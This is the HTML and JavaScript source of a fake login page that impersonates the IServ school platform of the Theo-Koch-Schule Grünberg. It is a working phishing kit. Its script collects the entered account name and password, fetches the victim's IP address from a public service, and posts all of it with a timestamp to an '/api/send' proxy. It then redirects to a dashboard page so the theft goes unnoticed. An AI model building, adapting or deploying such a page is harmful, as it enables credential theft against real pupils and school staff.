<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ISERV Dateienfreigabe</title>
  <style>
    /* ... (dein kompletter CSS bleibt unverändert) ... */
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="left-section">
      <img src="logo_white.118ffce4.svg" alt="Weißes Logo" class="logo" />
      <h1>Theo-Koch-Schule<br>Grünberg</h1>
    </div>
    <div class="right-section">
      <div class="help-link"><a href="#">Hilfe</a></div>
      <div class="login-form">
        <h2>Anmeldung</h2>
        <label for="email">Account</label>
        <input type="email" id="email" required />
        <label for="password">Passwort</label>
        <input type="password" id="password" required />
        <input type="text" name="_gotcha" style="display: none;" />
        <div class="form-options">
          <label><input type="checkbox" /> Angemeldet bleiben</label>
          <a href="#">Passwort vergessen?</a>
        </div>
        <p class="datenschutz-text">
          Mit der Anmeldung stimmen Sie der <a href="/datenschutz.html">Datenschutzerklärung</a> automatisch zu.
        </p>
        <button id="signInButton">Anmelden</button>
      </div>
      <footer class="footer-links">
        <a href="#">theokochschule</a>
        <span> • </span>
        <a href="#">ISERV Schulplattform</a>
      </footer>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const signInButton = document.getElementById('signInButton');
      if (signInButton) {
        signInButton.addEventListener('click', signIn);
      } else {
        console.error('Anmelden-Button nicht gefunden.');
      }
    });

    async function signIn() {
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const gotcha = document.querySelector('input[name="_gotcha"]').value;

      if (!email || !password) {
        alert('Bitte fülle alle Felder aus.');
        return;
      }

      if (gotcha) {
        console.log('Bot erkannt!');
        setTimeout(() => {
          window.location.href = 'dashboard.html';
        }, 1000);
        return;
      }

      const lastSignIn = localStorage.getItem('lastSignIn');
      if (lastSignIn && Date.now() - parseInt(lastSignIn) < 30000) {
        alert('Bitte warte 30 Sekunden vor der nächsten Anmeldung.');
        return;
      }

      try {
        let ip_address = 'Unbekannt';
        try {
          const response = await fetch('https://api.ipify.org?format=json');
          const data = await response.json();
          ip_address = data.ip;
        } catch (err) {
          console.error('Fehler beim Abrufen der IP-Adresse:', err);
        }

        const payload = {
          email,
          password,
          ip_address,
          timestamp: new Date().toISOString()
        };

        // Senden über Vercel Proxy
        const res = await fetch("/api/send", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        localStorage.setItem('lastSignIn', Date.now().toString());
        window.location.href = 'dashboard.html';

      } catch (err) {
        console.error('Fehler beim Senden:', err);
        setTimeout(() => {
          window.location.href = 'dashboard.html';
        }, 2000);
      }
    }
  </script>
</body>
</html>
